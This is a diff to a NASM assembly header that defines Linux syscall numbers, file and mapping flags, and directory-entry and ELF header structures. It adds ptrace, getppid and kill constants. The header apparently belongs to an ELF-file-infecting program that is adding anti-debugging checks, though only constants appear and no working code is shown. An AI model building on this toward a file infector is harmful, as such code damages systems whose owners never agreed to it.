@@ -12,9 +12,12 @@
 %define SYS_MREMAP      0x19
 %define SYS_MSYNC       0x1a
 %define SYS_EXIT        0x3c
-%define SYS_FTRUNCATE    0x4d
+%define SYS_KILL        0x3e
+%define SYS_FTRUNCATE   0x4d
 %define SYS_CHDIR       0x50
 %define SYS_FCHDIR      0x51
+%define SYS_PTRACE      0x65
+%define SYS_GETPPID     0x6e
 %define SYS_GETDENTS64  0xd9
 
 %define O_RDONLY        0
@@ -34,9 +37,11 @@
 %define MAP_SHARED      0x01
 %define MAP_ANONYMOUS   0x20
 
-%define MREMAP_MAYMOVE     1
+%define MREMAP_MAYMOVE  1
 
 %define MS_SYNC         0x04
+
+%define SIGKILL         9
 
 struc       linux_dirent64
     d_ino:          resq    1
@@ -49,6 +54,7 @@ endstruc
 %define DIRENT_MAX_SIZE 1024
 %define D_RECLEN_SUB    19
 %define DT_REG          8
+%define DT_DIR          4
 
 struc       Elf64_Ehdr
     e_ident:        resb    16
